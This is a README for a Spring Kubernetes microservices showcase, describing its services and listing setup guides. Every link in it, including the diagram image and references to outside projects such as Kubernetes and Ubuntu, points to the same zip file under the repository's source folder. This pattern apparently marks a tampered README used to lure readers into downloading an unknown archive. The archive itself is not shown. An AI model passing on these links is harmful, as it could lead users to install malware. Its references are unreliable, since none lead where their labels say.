# Spring Kubernetes Micro Services Showcase

[Kubernetes](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip) is leading orchestration framework which enables automated deployments, scaling, and management of containerized applications.
Spring Kubernetes Micro Services is a showcase application which uses the new [Spring Cloud Kubernetes](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip) framework to manage service discovery and is deployed on kubernetes network.
The application provides services to fetch the generated report documents using [Spring Batch](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip) and stored on a [Minio cloud storage](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip).
The application has below services.

* [Discovery Service](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Eureka discovery service allows micro services to find and communicate with each other for local testing. Kubernetes uses [Spring Cloud Kubernetes](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip) for service discovery.
* [Data Service](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Data service provides reactive services using Spring WebFlux to store and fetch report document data.
* [Minio Service](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip):  Minio service provides private cloud storage services to store and fetch files.
* [Storage Service](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Storage services provide service to fetch files using object id and bucket. 
* [Document Service](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Document service exposes services to get list of reports for the user and download them using document id. 
* [Elastic Logging](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): ElasticSearch-Beats-Logstash-Kibana provides log storage and management.
* [Ingress Controller](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Ingress controller is responsible for directing external traffic to corresponding Kubernetes service within the cluster.


   ![Spring Kubernetes Microservices Design](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip)


Follow the below documentation in order to setup this application using Kubernetes.

* [Kubernetes Architecture](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Blog post discussing Kubernetes concepts, architecture and various commands in depth.
* [Kubernetes Installation](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Setup Kubernetes Master and Worker nodes for [Ubuntu Bionic](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip). Please refer to various documentations online for respective operating systems.
* [Docker Registry](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Docker registry setup is required to distribute docker images to various Kubernetes pods. 
* [Kubernetes Commands](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Kubernetes commands provides some frequently used commands to deploy and delete/clean up Kubernetes services and debug or troubleshoot kubernetes pods.
* [Helm](https://raw.githubusercontent.com/antonioluzzi/spring-kubernetes-microservices/master/storage-service/src/spring-kubernetes-microservices_3.0.zip): Helm is the package manager for Kubernetes which assists in installing and managing applications on Kubernetes clusters.
